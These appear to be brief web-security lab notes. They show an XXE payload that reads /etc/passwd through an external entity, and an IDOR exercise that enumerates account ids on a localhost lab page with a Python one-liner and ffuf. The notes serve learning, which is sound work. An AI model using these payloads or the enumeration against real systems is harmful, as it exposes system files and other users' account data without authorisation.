# XXE and IDOR

### XXE - External Entities Injection

Additional payloads at [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

xxe-safe.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<creds>
    <user>testuser</user>
    <password>testpass</password>
</creds>
```

Example XML entities:

https://portswigger.net/web-security/xxe/xml-entities

`&lt;` < less than
`&gt;` > greater than
`&amp;` & ampersand

xxe-exploit.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE creds [
<!ELEMENT creds ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<creds><user>&xxe;</user><password>pass</password></creds>
```

External entity `xxe` references the /etc/passwd file and will pass the value into user tag, displaying the 
file to the user

### IDOR - Insecure Direct Object Reference

BOLA in APIs

Exposed id's of various objects can be changed to access unauthorized objects

The following will display a normal user

`http://localhost/labs/e0x02.php?account=1009`

Changing the id to 1010 will show an admin's account details

Generate an id file with python

`python3 -c 'for i in range(1,2001): print(i)' > num.txt`

Use ffuf to find valid ids

`ffuf -u 'http://localhost/labs/e0x02.php?account=FUZZ' -w num.txt -fs failed-response-length`

Write script to find all admin type users from discovered user ids
